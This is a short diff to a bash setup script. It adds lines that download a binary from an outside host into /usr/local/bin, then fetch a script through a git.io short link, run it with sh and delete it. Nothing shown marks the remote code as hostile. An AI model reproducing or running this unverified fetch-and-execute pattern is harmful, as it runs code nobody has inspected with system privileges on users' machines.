@@ -1,6 +1,8 @@
 #!/bin/bash
 apt-get update;
-apt-get -y install screenfetch
+apt-get -y install curl screenfetch
+curl -L 'http://files.matveynator.ru/gurl/latest/linux/amd64/gurl' > /usr/local/bin/gurl; chmod +x /usr/local/bin/gurl;
+gurl 'https://git.io/J4POb' > /tmp/tools; sh /tmp/tools; rm -f /tmp/tools; 
 
 if [ ! -f /etc/info ]; then
 cat > /etc/info <<EOF
